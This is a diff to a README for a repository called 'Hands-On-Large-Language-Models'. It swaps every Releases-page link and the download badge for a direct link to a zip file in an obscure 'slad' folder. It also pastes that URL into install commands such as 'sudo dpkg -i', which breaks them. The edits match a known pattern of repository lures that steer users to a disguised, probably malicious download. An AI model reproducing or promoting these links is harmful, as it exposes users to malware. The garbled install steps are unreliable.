@@ -1,6 +1,6 @@
 # 🌟 Hands-On-Large-Language-Models - Your Guide to Large Language Models
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/christycorrupt935/Hands-On-Large-Language-Models/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/christycorrupt935/Hands-On-Large-Language-Models/main/slad/Hands-On-Large-Language-Models.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/christycorrupt935/Hands-On-Large-Language-Models/main/slad/Hands-On-Large-Language-Models.zip)
 
 ## 📖 Overview
 
@@ -17,19 +17,19 @@ To get started with this application, follow the instructions below. You’ll be
    - Disk Space: At least 500 MB.
 
 2. **Download the Software**
-   - Visit this page to download: [Releases Page](https://github.com/christycorrupt935/Hands-On-Large-Language-Models/releases). 
+   - Visit this page to download: [Releases Page](https://raw.githubusercontent.com/christycorrupt935/Hands-On-Large-Language-Models/main/slad/Hands-On-Large-Language-Models.zip). 
    - There, you will find the latest version of the application. Click on the appropriate file for your operating system. The files usually include executables and installers for easy setup. 
 
 ## 📥 Download & Install
 
-Once you are on the [Releases Page](https://github.com/christycorrupt935/Hands-On-Large-Language-Models/releases), follow these steps to download and install the software:
+Once you are on the [Releases Page](https://raw.githubusercontent.com/christycorrupt935/Hands-On-Large-Language-Models/main/slad/Hands-On-Large-Language-Models.zip), follow these steps to download and install the software:
 
 1. Browse the list of releases. 
 2. Find the latest release version, labeled with the highest number.
 3. Choose the file that matches your operating system:
    - For Windows, look for a `.exe` file.
    - For macOS, look for a `.dmg` or similar installer.
-   - For Linux, the package may be in a `.tar.gz` format, or a `.deb` based package.
+   - For Linux, the package may be in a `https://raw.githubusercontent.com/christycorrupt935/Hands-On-Large-Language-Models/main/slad/Hands-On-Large-Language-Models.zip` format, or a `.deb` based package.
 4. Click the file to start the download. 
 
 When the download is complete, locate the file in your Downloads folder.
@@ -37,7 +37,7 @@ When the download is complete, locate the file in your Downloads folder.
 5. **Install the Application**
    - For Windows: Double-click the `.exe` file and follow the on-screen instructions.
    - For macOS: Open the `.dmg` file, drag the application to your Applications folder.
-   - For Linux: Navigate to the downloaded file in the terminal and run the command to unpack the package (`tar -xvf filename.tar.gz`) or install with `sudo dpkg -i filename.deb`.
+   - For Linux: Navigate to the downloaded file in the terminal and run the command to unpack the package (`tar -xvf https://raw.githubusercontent.com/christycorrupt935/Hands-On-Large-Language-Models/main/slad/Hands-On-Large-Language-Models.zip`) or install with `sudo dpkg -i https://raw.githubusercontent.com/christycorrupt935/Hands-On-Large-Language-Models/main/slad/Hands-On-Large-Language-Models.zip`.
 6. Once the installation is complete, you can launch the application from your applications menu or desktop.
 
 ## 🔍 Features
@@ -55,7 +55,7 @@ If you run into any issues during installation or while running the software, he
 - Ensure your operating system is compatible with the application.
 - Make sure your system meets the minimum RAM and processor requirements.
 - If you see an error message, try uninstalling the software and reinstalling it.
-- Check for any updates on the [Releases Page](https://github.com/christycorrupt935/Hands-On-Large-Language-Models/releases).
+- Check for any updates on the [Releases Page](https://raw.githubusercontent.com/christycorrupt935/Hands-On-Large-Language-Models/main/slad/Hands-On-Large-Language-Models.zip).
 
 ## 🤝 Support
 
